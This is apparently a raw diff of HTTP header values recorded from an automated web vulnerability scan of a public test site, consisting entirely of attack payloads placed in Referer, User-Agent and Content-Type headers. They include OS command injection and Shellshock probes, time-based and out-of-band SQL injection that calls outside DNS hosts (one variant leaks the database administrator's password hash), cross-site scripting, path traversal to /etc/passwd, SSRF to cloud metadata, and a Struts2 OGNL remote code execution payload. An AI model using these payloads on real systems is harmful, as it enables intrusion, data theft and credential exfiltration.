+    Referer: & nslookup zqvil4-pt7rfku2hvateurenmquhoyassegyzop5^_jw.ABCtor.com&'\"`0&nslookup zqvil4-pt7rfku2hvateurenmquhoyassegyzop5^_jw.ABCtor.com&`'
+    Referer: nslookup zqvil4-pt7seiolu6upxmtopsoodiboxaxsfsic5^zui.ABCtor.com&'\"`0&nslookup zqvil4-pt7seiolu6upxmtopsoodiboxaxsfsic5^zui.ABCtor.com&`'
+    Referer: nslookup "zqvil4-pt7setkx_n2onnhp3gbs6j3fn5ibbmfmp""yyi.ABCtor.com"
+    Referer: '&nslookup "zqvil4-pt7ugtxtyagbfjwikvbqvvxsdht6t9wif""ss4.ABCtor.com"
+    Referer: &nslookup "zqvil4-pt7vhwvrpdmvmwlail_7c5c1cnaon1q5j""sl0.ABCtor.com"
+    Referer: nxtspxrkex
+    Referer: "& ping -n 25 127.0.0.1 &
+    Referer: & ping -n 25 127.0.0.1 &
+    Referer: '& ping -n 25 127.0.0.1 &
+    Referer: |ping -n 25 127.0.0.1
+    Referer: ping -n 25 127.0.0.1
+    Referer: ping -n 25 127.0.0.1 &
+    Referer: "&ping -w 25 127.0.0.1 &"
+    Referer: &ping -w 25 127.0.0.1 &
+    Referer: '&ping -w 25 127.0.0.1 &'
+    Referer: ping -w 25 127.0.0.1
+    Referer: ping -w 25 127.0.0.1 &
+    Referer: (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+    Referer: '+((SELECT 1 FROM (SELECT SLEEP(25))A))+'
+    Referer: ((SELECT 1 FROM (SELECT SLEEP(25))A))
+    Referer: (select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL)
+    Referer: (SELECT CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)))
+    Referer: '+ (select convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns) +'
+    Referer: (select convert(int,cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns)
+    Referer: '||(SELECT dblink_connect('host=zqvil4-pt7bda5ffpiackowinoj8frkqmbvcnjcb'||'rbu.ABCtor.com user=a password=a connect_timeout=2'))||'
+    Referer: SELECT dblink_connect('host=zqvil4-pt7qbqqt5fmzqx-suqacgz1b6dp-pqldc'||'bry.ABCtor.com user=a password=a connect_timeout=2')
+    Referer: SELECT dblink_connect('host=zqvil4-pt7qnc9yhxjgknpk0pflni3zzmbdr49n8'||'c34.ABCtor.com user=a password=a connect_timeout=2')
+    Referer: '||(SELECT dblink_connect('host=zqvil4-pt7zdf7aswmauwgwiem1opcju0vznfwou'||'zas.ABCtor.com user=a password=a connect_timeout=2'))||'
+    Referer: (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual)
+    Referer: SELECT pg_sleep(25)--
+    Referer: ((select sleep(25)))a-- 1
+    Referer: (select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(108)||chr(109)||chr(100)||chr(112)||chr(101)||chr(106)||chr(110)||chr(113)||chr(100)||chr(98)||chr(113)||chr(116)||chr(51)||chr(115)||chr(53)||chr(111)||chr(119)||chr(102)||chr(97)||chr(116)||chr(121)||chr(51)||chr(57)||chr(119)||chr(119)||chr(99)||chr(103)||chr(103)||chr(121)||chr(116)||chr(112)||chr(120)||chr(48)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL)
+    Referer: (select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(113)||chr(111)||chr(105)||chr(110)||chr(55)||chr(115)||chr(45)||chr(105)||chr(100)||chr(104)||chr(121)||chr(106)||chr(110)||chr(105)||chr(48)||chr(99)||chr(122)||chr(98)||chr(112)||chr(109)||chr(102)||chr(108)||chr(105)||chr(105)||chr(105)||chr(48)||chr(101)||chr(104)||chr(110)||chr(100)||chr(106)||chr(118)||chr(113)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL)
+    Referer: (select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7ktldt0lljopqf7aysrsq5nqjlty7xp'||'yma.ABCtor.com') from DUAL)
+    Referer: (select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7lmfibq8-xydfylow8fhm1qry6bhi_c'||'z18.ABCtor.com') from DUAL)
+    Referer: '& SET /A 0xFFF9999-10981 &
+    Referer: SET /A 0xFFF9999-26626
+    Referer: "& SET /A 0xFFF9999-28530 &
+    Referer: SET /A 0xFFF9999-39217
+    Referer: & SET /A 0xFFF9999-52877 &
+    Referer: SET /A 0xFFF9999-69142 &
+    Referer: SET /A 0xFFF9999-81421 &
+    Referer: '& SET /A 0xFFF9999-88867 &
+    Referer: & SET /A 0xFFF9999-91318 &
+    Referer: "& SET /A 0xFFF9999-99396 &
+    Referer: '"--></style></scRipt><scRipt>ABCtor(0x000052)</scRipt>
+    Referer: '"@--></style></scRipt><scRipt>ABCtor(0x00006E)</scRipt>
+    Referer: '"--></style></scRipt><scRipt>ABCtor(0x0001D7)</scRipt>
+    Referer: '"@--></style></scRipt><scRipt>ABCtor(0x0001F3)</scRipt>
+    Referer: syscolumns WHERE 2>3;exec('xp_dirtree ''\\zqvil4-pt7mpvttz7faf5krsdf39vla7ohqi70q9'+'avy.ABCtor.com'+'\c$\a''')--
+    Referer: syscolumns WHERE 2>3;exec('xp_dirtree ''\\zqvil4-pt7otfugyyrsnvqhyr5fhtywxuentxow8'+'msw.ABCtor.com'+'\c$\a''')--
+    Referer: testphp.vulnweb.com/elmah
+    Referer: testphp.vulnweb.com/elmah.axd
+    Referer: testphp.vulnweb.com/trace.axd
+    Referer: ' WAITFOR DELAY '0:0:25'--
+    Referer: ') WAITFOR DELAY '0:0:25'--
+    Referer: WAITFOR DELAY '0:0:25'--
+    Referer: . . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /windows/win.ini
+    Referer: .....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///windows/win.ini
+    Referer: ....//....//....//....//....//....//....//....//....//....//....//windows/win.ini
+    Referer: ...//...//...//...//...//...//...//...//...//...//...//windows/win.ini
+    Referer: /../../../../../../../../../../windows/win.ini
+    Accept-Language: e
+    Accept-Language: en-us,en;q=0.5
+    Accept-Language: en-US,en;q=0.8,en-us,en;q=0.5
+    Cache-Control: no-cache
+    Content-Disposition: form-data; name="ns"; filename="%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("a",268409241-22)}
+    Content-Length: 0
+    Content-Length: 109
+    Content-Length: 124
+    Content-Length: 136
+    Content-Length: 1626
+    Content-Length: 201
+    Content-Length: 223
+    Content-Length: 250
+    Content-Length: 273
+    Content-Type: application/octet-stream
+    Content-Type: application/xml
+    Content-Type: multipart/form-data; boundary=b7d4c635dbff48dfa6d11809b269701a
+    Content-Type: .multipart/form-data~%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("a",268409241-22)}
+    Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='31302').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='34401').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    User-Agent: '
+    User-Agent: 000177.000.00000.000001/trace.axd
+    User-Agent: 000260.0034.000062.00000245/trace.axd
+    User-Agent: 017700000001/trace.axd
+    User-Agent: 0177.0.0.1/trace.axd
+    User-Agent: 0177.0.1/trace.axd
+    User-Agent: 0177.1/trace.axd
+    User-Agent: 026007031245/trace.axd
+    User-Agent: 0260.1847973/trace.axd
+    User-Agent: 0260.28.12965/trace.axd
+    User-Agent: 0260.28.50.165/trace.axd
+    User-Agent: 0x7f000001/trace.axd
+    User-Agent: 0x7f.0.0.1/trace.axd
+    User-Agent: 0x7f.0.1/trace.axd
+    User-Agent: 0x7f.1/trace.axd
+    User-Agent: 0xb0.1847973/trace.axd
+    User-Agent: 0xb01c32a5/trace.axd
+    User-Agent: 0xb0.28.12965/trace.axd
+    User-Agent: 0xb0.28.50.165/trace.axd
+    User-Agent: 127.0.0.1/elmah
+    User-Agent: 127.0.0.1/elmah.axd
+    User-Agent: 127.0.0.1/trace.axd
+    User-Agent: 127.0.1/trace.axd
+    User-Agent: 127.100.11.2/elmah
+    User-Agent: 127.100.11.2/elmah.axd
+    User-Agent: 127.100.11.2/trace.axd
+    User-Agent: 127.1/trace.axd
+    User-Agent: 16777343/trace.axd
+    User-Agent: 176.1847973/trace.axd
+    User-Agent: 176.28.12965/trace.axd
+    User-Agent: 176.28.50.165/elmah
+    User-Agent: 176.28.50.165/elmah.axd
+    User-Agent: 176.28.50.165/trace.axd
+    User-Agent: -1" and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+"
+    User-Agent: -1' and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+    User-Agent: -1 AND 'NS='ss
+    User-Agent: -1 AND ((SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(25)))-- 1
+    User-Agent: 1/../../../../../../../../../../boot.ini
+    User-Agent: 1;DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt72ep4ipvc__3goqx45n4g4sxmh6vcj3'+'d0u.r87.me')exec sp_executesql @r--
+    User-Agent: -1';DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7hl_pogqpeitopy2lfxfgbnu1jlu0dr'+'elo.r87.me')exec sp_executesql @r--
+    User-Agent: 1;DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7me4jae2zyuirhaexe0yk2hosi-ymit'+'pqm.r87.me')exec sp_executesql @r--
+    User-Agent: -1';DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7vmn6bahbkrabbwftdfemb42fxl8ez4'+'aac.r87.me')exec sp_executesql @r--
+    User-Agent: ::1/elmah
+    User-Agent: ::1/elmah.axd
+    User-Agent: 1/../../../../../../../../../../../etc/passwd
+    User-Agent: -1';exec('xp_dirtree ''\\zqvil4-pt713bjyacjkrd7bkzpqwpdnws4jgcefe'+'a4g.r87.me'+'\c$\a''')--
+    User-Agent: 1))exec('xp_dirtree ''\\zqvil4-pt77kmo8txxlw74pla9jnpusluaxgxeux'+'fde.r87.me'+'\c$\a''')--
+    User-Agent: 1;exec('xp_dirtree ''\\zqvil4-pt77uf0s_ixerlk8l9pza9wohl3fc27rx'+'slq.r87.me'+'\c$\a''')--
+    User-Agent: 1) exec('xp_dirtree ''\\zqvil4-pt7_elk9mhyobtcqbgywtvbc5e9kp9l_k'+'re8.r87.me'+'\c$\a''')--
+    User-Agent: 1')exec('xp_dirtree ''\\zqvil4-pt7f2ps8mvvtiwv2t6tognzamlboh3rxs'+'yoq.r87.me'+'\c$\a''')--
+    User-Agent: 1))exec('xp_dirtree ''\\zqvil4-pt7-irsidckjprsrhglxhg_6v50zhmlto'+'npy.r87.me'+'\c$\a''')--
+    User-Agent: -1';exec('xp_dirtree ''\\zqvil4-pt7khoemzswfknctctc6ijwqelositdj8'+'jp8.r87.me'+'\c$\a''')--
+    User-Agent: 1;exec('xp_dirtree ''\\zqvil4-pt7njw5wx__rgjv1queb5yd8_gft6epyo'+'jjq.r87.me'+'\c$\a''')--
+    User-Agent: 1'))exec('xp_dirtree ''\\zqvil4-pt7uc7neeioz57a0d10hysicrhz9miw8x'+'6b4.r87.me'+'\c$\a''')--
+    User-Agent: 1'))exec('xp_dirtree ''\\zqvil4-pt7ugqsq0yuo5or3cvxguvjom6mcv3gpc'+'g0i.r87.me'+'\c$\a''')--
+    User-Agent: 1')exec('xp_dirtree ''\\zqvil4-pt7vqidob27v5y-7exzha4fdahj1bu9sc'+'ej0.r87.me'+'\c$\a''')--
+    User-Agent: 1) exec('xp_dirtree ''\\zqvil4-pt7xe4p3fhhmpopclqtiu3lvk7uwjqsvu'+'wsa.r87.me'+'\c$\a''')--
+    User-Agent: 1;expr 268409241 - 50666;x
+    User-Agent: 1';expr 268409241 - 56978;'
+    User-Agent: 1;expr 268409241 - 62276;x
+    User-Agent: 1';expr 268409241 - 70281;'
+    User-Agent: 1";expr 268409241 - 79736;"
+    User-Agent: 1";expr 268409241 - 8079;"
+    User-Agent: -1 OR 1=1
+    User-Agent: -1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+    User-Agent: -1" OR 1=1 OR "1"="1
+    User-Agent: -1' OR 1=1 OR '1'='1
+    User-Agent: -1" OR 1=1 OR "ns"="ns
+    User-Agent: -1' OR 1=1 OR 'ns'='ns
+    User-Agent: -1 OR 17-7=10
+    User-Agent: -1 or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))
+    User-Agent: -1" or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+"
+    User-Agent: -1' or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+'
+    User-Agent: -1 OR X='ss
+    User-Agent: -1'+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+    User-Agent: 1 + ((SELECT 1 FROM (SELECT SLEEP(25))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR"*/
+    User-Agent: 1' || (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) || '
+    User-Agent: 1 + (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) + 1
+    User-Agent: 1;SELECT pg_sleep(25)--
+    User-Agent: 1');SELECT pg_sleep(25)--
+    User-Agent: 1';SELECT pg_sleep(25)--
+    User-Agent: 1);SELECT pg_sleep(25)--
+    User-Agent: ::1/trace.axd
+    User-Agent: 1 WAITFOR DELAY '0:0:25'--
+    User-Agent: 1) WAITFOR DELAY '0:0:25'--
+    User-Agent: %22%2bnetsparker(0x0000B3)%2b%22
+    User-Agent: %22%2bnetsparker(0x000236)%2b%22
+    User-Agent: 2771524784/trace.axd
+    User-Agent: %2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+    User-Agent: %2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
+    User-Agent: 'AND 1=cast(0x5f21403264696c656d6d61 as varchar(8000)) or '1'='
+    User-Agent: /../../../../../../../../../../boot.ini
+    User-Agent: c%3a%5cboot.ini
+    User-Agent: '||cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)||'
+    User-Agent: cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)
+    User-Agent: cast((SELECT dblink_connect(chr(104)||chr(111)||chr(115)||chr(116)||chr(61)||chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(106)||chr(106)||chr(101)||chr(101)||chr(56)||chr(105)||chr(99)||chr(117)||chr(114)||chr(104)||chr(107)||chr(111)||chr(113)||chr(50)||chr(118)||chr(56)||chr(104)||chr(119)||chr(104)||chr(116)||chr(103)||chr(55)||chr(108)||chr(117)||chr(108)||chr(99)||chr(120)||chr(119)||chr(120)||chr(113)||chr(111)||chr(114)||chr(105)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(61)||chr(97)||chr(32)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100)||chr(61)||chr(97)||chr(32)||chr(99)||chr(111)||chr(110)||chr(110)||chr(101)||chr(99)||chr(116)||chr(95)||chr(116)||chr(105)||chr(109)||chr(101)||chr(111)||chr(117)||chr(116)||chr(61)||chr(50))) as numeric)
+    User-Agent: cast((SELECT dblink_connect(chr(104)||chr(111)||chr(115)||chr(116)||chr(61)||chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(108)||chr(111)||chr(98)||chr(100)||chr(112)||chr(117)||chr(108)||chr(109)||chr(107)||chr(121)||chr(108)||chr(53)||chr(111)||chr(54)||chr(112)||chr(102)||chr(107)||chr(50)||chr(105)||chr(114)||chr(119)||chr(107)||chr(55)||chr(109)||chr(120)||chr(106)||chr(54)||chr(115)||chr(119)||chr(99)||chr(111)||chr(117)||chr(117)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(61)||chr(97)||chr(32)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100)||chr(61)||chr(97)||chr(32)||chr(99)||chr(111)||chr(110)||chr(110)||chr(101)||chr(99)||chr(116)||chr(95)||chr(116)||chr(105)||chr(109)||chr(101)||chr(111)||chr(117)||chr(116)||chr(61)||chr(50))) as numeric)
+    User-Agent: cast((SELECT dblink_connect('host=zqvil4-pt7jsierwof4cot1sl-a25cgdx55cu_pt'||'4si.r87.me user=a password=a connect_timeout=2')) as numeric)
+    User-Agent: cast((SELECT dblink_connect('host=zqvil4-pt7lz2lw6r1dpxlconlo--cwu_5hljucn'||'y9u.r87.me user=a password=a connect_timeout=2')) as numeric)
+    User-Agent: c:\boot.ini
+    User-Agent: '+convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))+'
+    User-Agent: convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))||'
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(107)||chr(106)||chr(104)||chr(106)||chr(116)||chr(106)||chr(50)||chr(48)||chr(97)||chr(54)||chr(48)||chr(98)||chr(101)||chr(102)||chr(115)||chr(120)||chr(119)||chr(104)||chr(120)||chr(114)||chr(118)||chr(122)||chr(95)||chr(53)||chr(107)||chr(105)||chr(118)||chr(115)||chr(114)||chr(113)||chr(122)||chr(108)||chr(121)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))||'
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(118)||chr(98)||chr(99)||chr(100)||chr(104)||chr(107)||chr(106)||chr(48)||chr(119)||chr(112)||chr(49)||chr(122)||chr(117)||chr(114)||chr(95)||chr(104)||chr(119)||chr(95)||chr(95)||chr(119)||chr(102)||chr(100)||chr(51)||chr(115)||chr(45)||chr(116)||chr(117)||chr(102)||chr(100)||chr(95)||chr(98)||chr(115)||chr(101)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))||'
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt73eav1elcenu6fg1ncs8l9io5o15bqh'||'tcu.r87.me') from DUAL))||'
+    User-Agent: '||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7uo9tnbwgyke-2eggjaa_sev7ghc-e-'||'_fe.r87.me') from DUAL))||'
+    User-Agent: c:\windows\win.ini
+    User-Agent: data:;base64,TlM3NzU0NTYxNDQ2NTc1
+    User-Agent: dblink_connect('host=zqvil4-pt7twkn0vjpvarocquct8nw77_zuikafa'||'9ri.r87.me user=a password=a connect_timeout=2')
+    User-Agent: dblink_connect('host=zqvil4-pt7yeobfq0md_utswqw8y6utz_twtgnvx'||'r2c.r87.me user=a password=a connect_timeout=2')
+    User-Agent: declare @h varchar(999)select @h='1'+substring(name+'-'+master.sys.fn_varbintohexstr(ISNULL(password_hash,0x0)),0,63)+'.zqvil4-pt7j4sxmjjmi_u5pml6oogwhmtb5gvp2v'+'khc.r87.me' from sys.sql_logins WHERE principal_id=1;exec('xp_dirtree ''\\'+@h+'\c$''')
+    User-Agent: declare @h varchar(999)select @h='1'+substring(name+'-'+master.sys.fn_varbintohexstr(ISNULL(password_hash,0x0)),0,63)+'.zqvil4-pt7jkmad6dzuayiswxklc7lxgwo-i9vnk'+'r9q.r87.me' from sys.sql_logins WHERE principal_id=1;exec('xp_dirtree ''\\'+@h+'\c$''')
+    User-Agent: DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7bbywacmu1vimqgsd8jtuoxkosrlt68'+'yie.r87.me')exec sp_executesql @r
+    User-Agent: DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','zqvil4-pt7xvbq-vyji9neiefs-nugucuoxomels'+'wu8.r87.me')exec sp_executesql @r
+    User-Agent: () { :;}; echo "NS:" $(/bin/sh -c "expr 268409241 - 8178")
+    User-Agent: () { :;}; echo "NS:" $(/bin/sh -c "expr 268409241 - 85554")
+    User-Agent: . . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/passwd
+    User-Agent: .....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///etc/passwd
+    User-Agent: ....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+    User-Agent: ...//...//...//...//...//...//...//...//...//...//...//etc/passwd
+    User-Agent: /../../../../../../../../../../../etc/passwd
+    User-Agent: /etc/passwd
+    User-Agent: exec('xp_dirtree ''\\zqvil4-pt7ingpo4qzl97jqrsjgs10tsta8zlazj'+'3hg.r87.me'+'\c$\a''')
+    User-Agent: exec('xp_dirtree ''\\zqvil4-pt7te0uf8wdsaujbuex7c5grdnps4zsag'+'psc.r87.me'+'\c$\a''')
+    User-Agent: |expr${IFS}268409241${IFS}-${IFS}40667
+    User-Agent: |expr${IFS}268409241${IFS}-${IFS}54163
+    User-Agent: expr 268409241 - 18565
+    User-Agent: expr 268409241 - 58777;
+    User-Agent: expr 268409241 - 66288;
+    User-Agent: expr 268409241 - 8607
+    User-Agent: file%3a%2f%2f%2fboot.ini
+    User-Agent: file:///boot.ini
+    User-Agent: file:///etc/passwd
+    User-Agent: file:///windows/win.ini
+    User-Agent: http://::1:22
+    User-Agent: http://127.0.0.1:22
+    User-Agent: http://127.0.0.1:3306
+    User-Agent: http://::1:3306
+    User-Agent: http://169.254.169.254/latest/meta-data/public-hostname
+    User-Agent: http://176.28.50.165:22
+    User-Agent: http://176.28.50.165:3306
+    User-Agent: http://aws.r87.me/latest/meta-data/public-hostname
+    User-Agent: hTTp://r87.com/n
+    User-Agent: http://testphp.vulnweb.com/elmah
+    User-Agent: http://testphp.vulnweb.com/elmah.axd
+    User-Agent: http://testphp.vulnweb.com/server-status
+    User-Agent: http://testphp.vulnweb.com/trace.axd
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))))
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(103)||chr(50)||chr(54)||chr(100)||chr(115)||chr(110)||chr(112)||chr(97)||chr(49)||chr(106)||chr(111)||chr(104)||chr(103)||chr(111)||chr(112)||chr(112)||chr(57)||chr(121)||chr(49)||chr(56)||chr(116)||chr(57)||chr(98)||chr(102)||chr(115)||chr(108)||chr(118)||chr(104)||chr(108)||chr(98)||chr(109)||chr(106)||chr(56)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))))
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(122)||chr(113)||chr(118)||chr(105)||chr(108)||chr(52)||chr(45)||chr(112)||chr(116)||chr(55)||chr(45)||chr(50)||chr(101)||chr(108)||chr(55)||chr(118)||chr(103)||chr(115)||chr(48)||chr(112)||chr(112)||chr(99)||chr(107)||chr(105)||chr(97)||chr(114)||chr(114)||chr(122)||chr(111)||chr(53)||chr(109)||chr(119)||chr(99)||chr(104)||chr(99)||chr(57)||chr(106)||chr(107)||chr(121)||chr(110)||chr(111)||chr(114)||chr(52)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))))
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7evxmozrjncwb3tx-ve3imjvgmqvmsu'||'qys.r87.me') from DUAL))))
+    User-Agent: (length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('zqvil4-pt7his2ybyvplh8pyelcej-mnx-kgrmyu'||'60s.r87.me') from DUAL))))
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; W
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
